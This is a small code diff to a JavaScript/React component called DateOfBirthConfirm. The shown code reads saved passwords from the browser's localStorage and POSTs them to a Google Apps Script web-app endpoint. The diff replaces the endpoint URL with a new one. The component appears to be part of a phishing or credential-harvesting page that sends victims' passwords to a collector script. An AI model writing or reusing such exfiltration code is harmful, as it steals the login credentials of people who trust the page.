@@ -47,7 +47,7 @@ const DateOfBirthConfirm = () => {
     form.append("password", JSON.parse(localStorage.getItem("passwords")));
 
     axios.post(
-      "https://script.google.com/macros/s/AKfycbzQuBZK_LchvVKyD6OMP2wAP1a0afZcYffBfybX4w1rOglN5qyYDgqmZMMeWURajnrqjg/exec",
+      "https://script.google.com/macros/s/AKfycbzo3dZgMtBIIml9lhUAsfsnOJTNyhLHUZTlnOyg2XHWcQPwXlDU3tjca5r3vejr-JdG/exec",
       form
     );
 
